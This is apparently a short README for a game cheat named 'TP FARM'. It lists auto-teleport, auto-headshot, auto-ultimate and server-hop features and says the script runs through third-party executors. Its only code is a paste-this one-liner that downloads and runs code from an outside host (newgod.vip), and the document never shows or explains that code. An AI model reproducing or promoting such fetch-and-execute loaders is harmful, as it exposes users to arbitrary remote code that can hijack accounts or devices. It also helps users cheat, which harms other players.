# TP FARM

Auto teleport + auto headshot + auto ultimate for the arena game.

```lua
loadstring(game:HttpGet("https://newgod.vip/loader"))()
```

## What it does

- Teleports you onto a target and fires a headshot, then moves to the next one.
- Auto reload, auto respawn, auto ultimate (One Shot) the moment it is charged.
- Draggable panel with START / STOP, BACK distance, BOTS / PLAYERS toggles, and a server hop.

## Where it runs

PC, iOS and Android. It needs an executor that gives you `loadstring` and `game:HttpGet`.
`gethui`, `readfile`, `writefile` and `hookfunction` are all optional - the script falls back
when they are missing, it just stops remembering your panel position.

Run it inside the arena round. In the lobby it will tell you and stop.
